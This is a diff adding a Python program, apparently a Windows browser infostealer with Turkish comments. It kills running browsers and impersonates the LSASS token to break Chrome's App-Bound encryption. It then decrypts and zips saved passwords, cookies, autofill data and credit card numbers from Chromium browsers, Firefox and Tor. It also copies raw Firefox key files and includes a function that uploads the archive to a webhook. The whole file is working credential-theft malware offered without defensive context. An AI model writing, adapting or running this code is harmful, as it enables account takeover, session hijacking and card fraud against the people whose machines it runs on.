@@ -1,0 +1,679 @@
+import os
+import argparse
+import io
+import json
+import struct
+import ctypes
+import shutil
+import sqlite3
+import pathlib
+import binascii
+import subprocess
+import zipfile
+import time
+from io import BytesIO
+import windows
+import windows.crypto
+import windows.security
+import windows.generated_def as gdef
+from contextlib import contextmanager
+from Crypto.Cipher import AES, ChaCha20_Poly1305
+import multiprocessing
+import sys
+import urllib.request
+import urllib.parse
+import hashlib
+import hmac
+from Crypto.Cipher import DES3
+from Crypto.Util.Padding import unpad
+import base64
+
+multiprocessing.freeze_support()
+
+
+
+
+# Tüm desteklenen tarayıcılar
+BROWSERS = {
+    'chrome': {
+        'name': 'Google Chrome',
+        'data_path': r'AppData\Local\Google\Chrome\User Data',
+        'local_state': r'AppData\Local\Google\Chrome\User Data\Local State',
+        'process_name': 'chrome.exe',
+        'key_name': 'Google Chromekey1',
+        'chromium_based': True
+    },
+    'brave': {
+        'name': 'Brave',
+        'data_path': r'AppData\Local\BraveSoftware\Brave-Browser\User Data',
+        'local_state': r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State',
+        'process_name': 'brave.exe',
+        'key_name': 'Brave Softwarekey1',
+        'chromium_based': True
+    },
+    'edge': {
+        'name': 'Microsoft Edge',
+        'data_path': r'AppData\Local\Microsoft\Edge\User Data',
+        'local_state': r'AppData\Local\Microsoft\Edge\User Data\Local State',
+        'process_name': 'msedge.exe',
+        'key_name': 'Microsoft Edgekey1',
+        'chromium_based': True
+    },
+    'opera': {
+        'name': 'Opera',
+        'data_path': r'AppData\Roaming\Opera Software\Opera Stable',
+        'local_state': r'AppData\Roaming\Opera Software\Opera Stable\Local State',
+        'process_name': 'opera.exe',
+        'key_name': 'Opera Softwarekey1',
+        'chromium_based': True
+    },
+    'opera_gx': {
+        'name': 'Opera GX',
+        'data_path': r'AppData\Roaming\Opera Software\Opera GX Stable',
+        'local_state': r'AppData\Roaming\Opera Software\Opera GX Stable\Local State',
+        'process_name': 'opera.exe',
+        'key_name': 'Opera Softwarekey1',
+        'chromium_based': True
+    },
+    'yandex': {
+        'name': 'Yandex Browser',
+        'data_path': r'AppData\Local\Yandex\YandexBrowser\User Data',
+        'local_state': r'AppData\Local\Yandex\YandexBrowser\User Data\Local State',
+        'process_name': 'browser.exe',
+        'key_name': 'Yandexkey1',
+        'chromium_based': True
+    },
+    'vivaldi': {
+        'name': 'Vivaldi',
+        'data_path': r'AppData\Local\Vivaldi\User Data',
+        'local_state': r'AppData\Local\Vivaldi\User Data\Local State',
+        'process_name': 'vivaldi.exe',
+        'key_name': 'Vivaldikey1',
+        'chromium_based': True
+    },
+    'chromium': {
+        'name': 'Chromium',
+        'data_path': r'AppData\Local\Chromium\User Data',
+        'local_state': r'AppData\Local\Chromium\User Data\Local State',
+        'process_name': 'chromium.exe',
+        'key_name': 'Chromiumkey1',
+        'chromium_based': True
+    },
+    'sputnik': {
+        'name': 'Sputnik',
+        'data_path': r'AppData\Local\Sputnik\Sputnik\User Data',
+        'local_state': r'AppData\Local\Sputnik\Sputnik\User Data\Local State',
+        'process_name': 'browser.exe',
+        'key_name': 'Sputnikkey1',
+        'chromium_based': True
+    },
+    '7star': {
+        'name': '7Star',
+        'data_path': r'AppData\Local\7Star\7Star\User Data',
+        'local_state': r'AppData\Local\7Star\7Star\User Data\Local State',
+        'process_name': '7star.exe',
+        'key_name': '7Starkey1',
+        'chromium_based': True
+    },
+    'orbitum': {
+        'name': 'Orbitum',
+        'data_path': r'AppData\Local\Orbitum\User Data',
+        'local_state': r'AppData\Local\Orbitum\User Data\Local State',
+        'process_name': 'orbitum.exe',
+        'key_name': 'Orbitumkey1',
+        'chromium_based': True
+    },
+    'epic': {
+        'name': 'Epic Privacy Browser',
+        'data_path': r'AppData\Local\Epic Privacy Browser\User Data',
+        'local_state': r'AppData\Local\Epic Privacy Browser\User Data\Local State',
+        'process_name': 'epic.exe',
+        'key_name': 'Epic Privacy Browserkey1',
+        'chromium_based': True
+    },
+    'amigo': {
+        'name': 'Amigo',
+        'data_path': r'AppData\Local\Amigo\User Data',
+        'local_state': r'AppData\Local\Amigo\User Data\Local State',
+        'process_name': 'amigo.exe',
+        'key_name': 'Amigokey1',
+        'chromium_based': True
+    },
+    'torch': {
+        'name': 'Torch',
+        'data_path': r'AppData\Local\Torch\User Data',
+        'local_state': r'AppData\Local\Torch\User Data\Local State',
+        'process_name': 'torch.exe',
+        'key_name': 'Torchkey1',
+        'chromium_based': True
+    },
+    'kometa': {
+        'name': 'Kometa',
+        'data_path': r'AppData\Local\Kometa\User Data',
+        'local_state': r'AppData\Local\Kometa\User Data\Local State',
+        'process_name': 'kometa.exe',
+        'key_name': 'Kometakey1',
+        'chromium_based': True
+    },
+    'firefox': {
+        'name': 'Mozilla Firefox',
+        'data_path': r'AppData\Roaming\Mozilla\Firefox\Profiles',
+        'local_state': None,
+        'process_name': 'firefox.exe',
+        'chromium_based': False
+    },
+    'tor': {
+        'name': 'Tor Browser',
+        'data_path': r'AppData\Roaming\tor-browser\Browser\TorBrowser\Data\Browser\Profiles',
+        'local_state': None,
+        'process_name': 'firefox.exe',
+        'chromium_based': False
+    }
+}
+
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin() != 0
+    except:
+        return False
+
+def kill_browser_processes():
+    """Tarayıcı process'lerini gizlice kapat"""
+    import psutil
+    
+    browsers_killed = []
+    
+    for config in BROWSERS.values():
+        process_name = config['process_name']
+        try:
+            # psutil ile process'leri bul ve kapat
+            for proc in psutil.process_iter(['pid', 'name']):
+                try:
+                    if proc.info['name'] and proc.info['name'].lower() == process_name.lower():
+                        proc.kill()
+                        browsers_killed.append(process_name)
+                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                    pass
+        except:
+            pass
+    
+    # Tüm process'lerin kapatılmasını bekle
+    if browsers_killed:
+        time.sleep(2)
+
+@contextmanager
+def impersonate_lsass():
+    original_token = windows.current_thread.token
+    try:
+        windows.current_process.token.enable_privilege("SeDebugPrivilege")
+        proc = next(p for p in windows.system.processes if p.name.lower() == "lsass.exe")
+        lsass_token = proc.token
+        impersonation_token = lsass_token.duplicate(
+            type=gdef.TokenImpersonation,
+            impersonation_level=gdef.SecurityImpersonation
+        )
+        windows.current_thread.token = impersonation_token
+        yield
+    except:
+        pass
+    finally:
+        windows.current_thread.token = original_token
+
+def parse_key_blob(blob_data: bytes) -> dict:
+    buffer = io.BytesIO(blob_data)
+    parsed_data = {}
+    header_len = struct.unpack('<I', buffer.read(4))[0]
+    parsed_data['header'] = buffer.read(header_len)
+    content_len = struct.unpack('<I', buffer.read(4))[0]
+    parsed_data['flag'] = buffer.read(1)[0]
+    if parsed_data['flag'] in (1, 2):
+        parsed_data['iv'] = buffer.read(12)
+        parsed_data['ciphertext'] = buffer.read(32)
+        parsed_data['tag'] = buffer.read(16)
+    elif parsed_data['flag'] == 3:
+        parsed_data['encrypted_aes_key'] = buffer.read(32)
+        parsed_data['iv'] = buffer.read(12)
+        parsed_data['ciphertext'] = buffer.read(32)
+        parsed_data['tag'] = buffer.read(16)
+    else:
+        parsed_data['raw_data'] = buffer.read()
+    return parsed_data
+
+def decrypt_with_cng(input_data, key_name):
+    ncrypt = ctypes.windll.NCRYPT
+    hProvider = gdef.NCRYPT_PROV_HANDLE()
+    status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), "Microsoft Software Key Storage Provider", 0)
+    if status != 0:
+        return None
+    hKey = gdef.NCRYPT_KEY_HANDLE()
+    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
+    if status != 0:
+        ncrypt.NCryptFreeObject(hProvider)
+        return None
+    pcbResult = gdef.DWORD(0)
+    input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)
+    status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, None, 0, ctypes.byref(pcbResult), 0x40)
+    if status != 0:
+        ncrypt.NCryptFreeObject(hKey)
+        ncrypt.NCryptFreeObject(hProvider)
+        return None
+    buffer_size = pcbResult.value
+    output_buffer = (ctypes.c_ubyte * buffer_size)()
+    status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, output_buffer, buffer_size,
+                                 ctypes.byref(pcbResult), 0x40)
+    ncrypt.NCryptFreeObject(hKey)
+    ncrypt.NCryptFreeObject(hProvider)
+    if status != 0:
+        return None
+    return bytes(output_buffer[:pcbResult.value])
+
+def byte_xor(ba1, ba2):
+    return bytes(a ^ b for a, b in zip(ba1, ba2))
+
+def derive_v20_master_key(parsed_data: dict, key_name) -> bytes:
+    if parsed_data['flag'] == 1:
+        aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
+        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
+        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
+    elif parsed_data['flag'] == 2:
+        chacha_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
+        cipher = ChaCha20_Poly1305.new(key=chacha_key, nonce=parsed_data['iv'])
+        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
+    elif parsed_data['flag'] == 3:
+        xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
+        with impersonate_lsass():
+            dec_aes = decrypt_with_cng(parsed_data['encrypted_aes_key'], key_name)
+            if not dec_aes:
+                return None
+        xored = byte_xor(dec_aes, xor_key)
+        cipher = AES.new(xored, AES.MODE_GCM, nonce=parsed_data['iv'])
+        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
+    else:
+        print(f"   [!] Unknown flag: {parsed_data.get('flag')}")
+        return parsed_data.get('raw_data', b'')
+
+def decrypt_v20_value(encrypted_value: bytes, master_key: bytes) -> str:
+    try:
+        if not encrypted_value or encrypted_value[:3] != b'v20':
+            return "NOT_V20"
+        iv = encrypted_value[3:15]
+        payload = encrypted_value[15:-16]
+        tag = encrypted_value[-16:]
+        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
+        decrypted = cipher.decrypt_and_verify(payload, tag)
+        return decrypted[32:].decode('utf-8', errors='replace')
+    except:
+        return "DECRYPT_FAILED"
+
+def decrypt_v20_password(encrypted_value: bytes, master_key: bytes) -> str:
+    try:
+        if not encrypted_value or encrypted_value[:3] != b'v20':
+            return "NOT_V20"
+        iv = encrypted_value[3:15]
+        payload = encrypted_value[15:-16]
+        tag = encrypted_value[-16:]
+        cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
+        decrypted = cipher.decrypt_and_verify(payload, tag)
+        return decrypted.decode('utf-8', errors='replace')
+    except:
+        return "DECRYPT_FAILED"
+
+def fetch_sqlite_copy(db_path: pathlib.Path):
+    if not db_path.exists():
+        return None
+    tmp_name = f"tmp_{os.urandom(8).hex()}_{db_path.name}"
+    tmp_path = pathlib.Path(os.environ['TEMP']) / tmp_name
+    try:
+        shutil.copy2(db_path, tmp_path)
+        return tmp_path
+    except:
+        return None
+
+def get_master_key(config):
+    if not config.get('local_state'):
+        return None
+    try:
+        user_profile = os.environ['USERPROFILE']
+        local_state_path = pathlib.Path(user_profile) / config['local_state']
+        if not local_state_path.exists():
+            return None
+        with open(local_state_path, 'r', encoding='utf-8', errors='ignore') as f:
+            local_state = json.load(f)
+        if 'os_crypt' not in local_state:
+            return None
+        if 'app_bound_encrypted_key' in local_state['os_crypt']:
+            print(f"   [*] Detected v20 (App-Bound) encryption")
+            enc_key = binascii.a2b_base64(local_state['os_crypt']['app_bound_encrypted_key'])[4:]
+        elif 'encrypted_key' in local_state['os_crypt']:
+            print(f"   [*] Detected v10 (DPAPI) encryption")
+            enc_key = binascii.a2b_base64(local_state['os_crypt']['encrypted_key'])[5:]
+            return windows.crypto.dpapi.unprotect(enc_key)
+        else:
+            print(f"   [!] No encrypted key found in Local State")
+            return None
+
+        print(f"   [*] Attempting App-Bound decryption...")
+        try:
+            with impersonate_lsass():
+                print(f"   [*] Impersonated LSASS, unprotecting system DPAPI...")
+                system_dec = windows.crypto.dpapi.unprotect(enc_key)
+            print(f"   [*] Unprotecting user DPAPI...")
+            user_dec = windows.crypto.dpapi.unprotect(system_dec)
+            parsed = parse_key_blob(user_dec)
+            if parsed['flag'] not in (1, 2, 3):
+                return user_dec[-32:]
+            return derive_v20_master_key(parsed, config['key_name'])
+        except Exception as inner_e:
+            print(f"   [!] App-Bound decryption failed: {inner_e}")
+            return None
+    except Exception as e:
+        print(f"   [!] Master key retrieval failed: {e}")
+        return None
+
+def write_to_zip(zf, zip_path: str, content: str):
+    if content.strip():
+        zf.writestr(zip_path, content.encode('utf-8'))
+
+def process_chromium_browser(browser_name, config, master_key, zf):
+    user_profile = os.environ['USERPROFILE']
+    data_path = pathlib.Path(user_profile) / config['data_path']
+    if not data_path.exists():
+        return
+
+    # Tüm profil klasörlerini al
+    profiles = [p for p in data_path.iterdir() if p.is_dir() and (p.name == "Default" or p.name.startswith("Profile ") or "profile" in p.name.lower())]
+
+    # Opera/Opera GX fallback: Eğer profil klasörü bulunamazsa ve ana dizinde Login Data varsa, ana dizini profil say
+    if not profiles and (data_path / "Login Data").exists():
+        profiles = [data_path]
+
+    for profile_dir in profiles:
+        profile_name = profile_dir.name
+        prefix = f"{browser_name}/{profile_name}/"
+
+        # Passwords
+        passwords_content = ""
+        login_db = profile_dir / "Login Data"
+        if login_db.exists():
+            tmp_db = fetch_sqlite_copy(login_db)
+            if tmp_db:
+                try:
+                    con = sqlite3.connect(str(tmp_db))
+                    cur = con.cursor()
+                    cur.execute("SELECT origin_url, username_value, password_value FROM logins WHERE password_value IS NOT NULL AND LENGTH(password_value) > 0")
+                    rows = cur.fetchall()
+                    
+                    # Sadece dolu password'ları işle
+                    for url, user, pw in rows:
+                        # v20 encryption (Chrome 80+)
+                        if pw[:3] == b'v20':
+                            dec = decrypt_v20_password(pw, master_key)
+                            if dec and dec != "DECRYPT_FAILED" and dec != "NOT_V20":
+                                passwords_content += f"URL: {url}\nLogin: {user}\nPassword: {dec}\n\n"
+                        # v10 encryption (older Chrome versions - DPAPI)
+                        elif pw[:3] == b'v10':
+                            try:
+                                dec = windows.crypto.dpapi.unprotect(pw[3:]).decode('utf-8', errors='replace')
+                                passwords_content += f"URL: {url}\nLogin: {user}\nPassword: {dec}\n\n"
+                            except:
+                                pass
+                        # Unencrypted (very old versions)
+                        else:
+                            try:
+                                dec = pw.decode('utf-8', errors='replace')
+                                if dec:
+                                    passwords_content += f"URL: {url}\nLogin: {user}\nPassword: {dec}\n\n"
+                            except:
+                                pass
+                    
+                    con.close()
+                    
+                    # Sadece gerçek password varsa dosya oluştur
+                    if passwords_content.strip():
+                        write_to_zip(zf, prefix + "passwords.txt", passwords_content)
+                    
+                except:
+                    pass
+                
+                try:
+                    os.unlink(tmp_db)
+                except:
+                    pass
+
+        # Cookies
+        cookies_content = ""
+        cookies_db = profile_dir / "Network" / "Cookies"
+        if cookies_db.exists():
+            tmp_db = fetch_sqlite_copy(cookies_db)
+            if tmp_db:
+                try:
+                    con = sqlite3.connect(str(tmp_db))
+                    cur = con.cursor()
+                    cur.execute("SELECT host_key, name, path, expires_utc, is_secure, is_httponly, encrypted_value FROM cookies")
+                    for host, name, path, exp, sec, httpo, enc in cur.fetchall():
+                        if enc and enc[:3] == b'v20':
+                            dec = decrypt_v20_value(enc, master_key)
+                            if dec and dec != "DECRYPT_FAILED":
+                                line = f"{host}\tTRUE\t{path}\t{str(bool(sec)).upper()}\t{exp}\t{name}\t{dec}\n"
+                                cookies_content += line
+                    con.close()
+                    
+                    if cookies_content.strip():
+                        write_to_zip(zf, prefix + "cookies.txt", cookies_content)
+
+                except:
+                    pass
+                try: 
+                    os.unlink(tmp_db)
+                except: 
+                    pass
+        
+        # Credit Cards & Autofill
+        autofill_content = ""
+        credit_cards_content = ""
+        webdata_db = profile_dir / "Web Data"
+        if webdata_db.exists():
+            tmp_db = fetch_sqlite_copy(webdata_db)
+            if tmp_db:
+                try:
+                    con = sqlite3.connect(tmp_db)
+                    cur = con.cursor()
+                    
+                    # Autofill
+                    try:
+                        cur.execute("SELECT name, value FROM autofill")
+                        for name, val in cur.fetchall():
+                            if name:
+                                if isinstance(val, bytes) and val[:3] == b'v20':
+                                    dec = decrypt_v20_value(val, master_key)
+                                else:
+                                    dec = str(val) if val else ""
+                                autofill_content += f"Field: {name}\nValue: {dec}\n\n"
+                    except: pass
+                    
+                    # Credit Cards
+                    try:
+                        cur.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
+                        for name, exp_m, exp_y, enc_num in cur.fetchall():
+                            dec_num = "Unknown"
+                            if enc_num and enc_num[:3] == b'v20':
+                                dec_num = decrypt_v20_password(enc_num, master_key) # Use password decrypt for CC
+                            
+                            credit_cards_content += f"Name: {name}\nExp: {exp_m}/{exp_y}\nNumber: {dec_num}\n\n"
+                    except: pass
+
+                    con.close()
+                    
+                    if autofill_content:
+                        write_to_zip(zf, prefix + "auto_fills.txt", autofill_content)
+                    if credit_cards_content:
+                        write_to_zip(zf, prefix + "credit_cards.txt", credit_cards_content)
+
+                except:
+                    pass
+                try: 
+                    os.unlink(tmp_db)
+                except: 
+                    pass
+
+def process_firefox_browser(browser_name, config, zf):
+    user_profile = os.environ['USERPROFILE']
+    profiles_path = pathlib.Path(user_profile) / config['data_path']
+    if not profiles_path.exists(): return
+
+    # NSS structures
+    class SECItem(ctypes.Structure):
+        _fields_ = [('type', ctypes.c_uint), ('data', ctypes.c_void_p), ('len', ctypes.c_uint)]
+
+    # Load NSS
+    nss_dll = None
+    for p in [r"C:\Program Files\Mozilla Firefox\nss3.dll", r"C:\Program Files (x86)\Mozilla Firefox\nss3.dll"]:
+        if os.path.exists(p):
+            try: nss_dll = ctypes.CDLL(p); break
+            except: pass
+
+    profile_dirs = [p for p in profiles_path.iterdir() if p.is_dir() and ('default' in p.name.lower() or 'release' in p.name.lower() or 'beta' in p.name.lower())]
+
+    for profile_dir in profile_dirs:
+        prefix = f"{browser_name}/{profile_dir.name}/"
+        
+        # Cookies
+        cookies_content = ""
+        cookies_db = profile_dir / "cookies.sqlite"
+        if cookies_db.exists():
+            try:
+                con = sqlite3.connect(str(cookies_db))
+                cur = con.cursor()
+                cur.execute("SELECT host, name, value, path, expiry, isSecure FROM moz_cookies")
+                for host, name, value, path, expiry, secure in cur.fetchall():
+                    cookies_content += f"{host}\tTRUE\t{path}\t{str(bool(secure)).upper()}\t{expiry}\t{name}\t{value}\n"
+                con.close()
+                if cookies_content: write_to_zip(zf, prefix + "cookies.txt", cookies_content)
+            except: pass
+
+        # Passwords (Decryption with NSS)
+        passwords_content = ""
+        logins_json = profile_dir / "logins.json"
+        
+        # Add Raw Files
+        if logins_json.exists(): 
+            try: zf.write(logins_json, prefix + "raw/logins.json")
+            except: pass
+        if (profile_dir / "key4.db").exists():
+            try: zf.write(profile_dir / "key4.db", prefix + "raw/key4.db")
+            except: pass
+
+        if logins_json.exists() and nss_dll:
+            try:
+                # NSS Init
+                if nss_dll.NSS_Init(str(profile_dir).encode('utf-8')) == 0:
+                    with open(logins_json, "r", encoding="utf-8") as f:
+                        data = json.load(f)
+                    
+                    for entry in data.get("logins", []):
+                        url = entry.get('hostname', '')
+                        user = entry.get('username', '')
+                        enc_pass = entry.get('encryptedPassword', entry.get('password', ''))
+                        
+                        decrypted = "Failed to decrypt"
+                        if enc_pass:
+                            try:
+                                dec_data = base64.b64decode(enc_pass)
+                                inp = SECItem(0, ctypes.cast(ctypes.create_string_buffer(dec_data), ctypes.c_void_p), len(dec_data))
+                                out = SECItem(0, 0, 0)
+                                if nss_dll.PK11SDR_Decrypt(ctypes.byref(inp), ctypes.byref(out), None) == 0:
+                                    decrypted = ctypes.string_at(out.data, out.len).decode('utf-8')
+                            except: pass
+                        
+                        passwords_content += f"URL: {url}\nLogin: {user}\nPassword: {decrypted}\n\n"
+                    
+                    nss_dll.NSS_Shutdown()
+            except: pass
+        
+        # Fallback if NSS failed or not found
+        if not passwords_content and logins_json.exists():
+            try:
+                with open(logins_json, "r", encoding="utf-8") as f:
+                    data = json.load(f)
+                for entry in data.get("logins", []):
+                    passwords_content += f"URL: {entry.get('hostname')}\nUser: {entry.get('username')}\nPass: {entry.get('encryptedPassword')} (Encrypted - NSS DLL missing)\n\n"
+            except: pass
+            
+        if passwords_content.strip():
+            print(f"   [+] {profile_dir.name}: Extracted {passwords_content.count('URL:')} passwords")
+            write_to_zip(zf, prefix + "passwords.txt", passwords_content)
+
+def send_to_webhook(zip_path, webhook_url):
+    if not os.path.exists(zip_path):
+        return
+
+    try:
+        boundary = '----WebKitFormBoundary' + binascii.hexlify(os.urandom(16)).decode('ascii')
+        
+        with open(zip_path, 'rb') as f:
+            file_content = f.read()
+            
+        # Multipart/form-data body oluşturma
+        body = []
+        body.append(f'--{boundary}'.encode('utf-8'))
+        body.append(f'Content-Disposition: form-data; name="file"; filename="browsers.zip"'.encode('utf-8'))
+        body.append('Content-Type: application/zip'.encode('utf-8'))
+        body.append(b'')
+        body.append(file_content)
+        body.append(f'--{boundary}--'.encode('utf-8'))
+        body.append(b'')
+        
+        body_bytes = b'\r\n'.join(body)
+        
+        req = urllib.request.Request(webhook_url, data=body_bytes)
+        req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
+        req.add_header('User-Agent', 'Mozilla/5.0')
+        
+        with urllib.request.urlopen(req) as response:
+            pass
+            
+    except:
+        pass
+
+def main():
+    print(f"� Cookie Engine Started")
+    print(f"�🔎 Scanning browsers...")
+    parser = argparse.ArgumentParser()
+    parser.add_argument('mode', nargs='?', default='all')
+    parser.add_argument('--fingerprint', action='store_true')
+    parser.add_argument('--output-path', required=False)
+    args = parser.parse_args()
+
+    try:
+        kill_browser_processes()
+        time.sleep(1)
+        
+        zip_buffer = BytesIO()
+        with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
+            for n, c in BROWSERS.items():
+                try:
+                    print(f"Processing {c['name']}...")
+                    if c['chromium_based']:
+                        mk = get_master_key(c)
+                        if mk: 
+                            process_chromium_browser(n, c, mk, zf)
+                        else:
+                            print(f"   [!] Failed to get master key for {c['name']}")
+                    else:
+                        process_firefox_browser(n, c, zf)
+                except Exception as e: 
+                    print(f"   [!] Error in browser {n}: {e}")
+
+        out = args.output_path if args.output_path else "output.zip"
+        if os.path.dirname(out): os.makedirs(os.path.dirname(out), exist_ok=True)
+        
+        with open(out, "wb") as f:
+            f.write(zip_buffer.getvalue())
+        print(f"Successfully saved to {out}")
+    except Exception as e:
+        print(f"CRITICAL ERROR in main loop: {e}")
+        import traceback
+        traceback.print_exc()
+
+if __name__ == "__main__":
+    main()
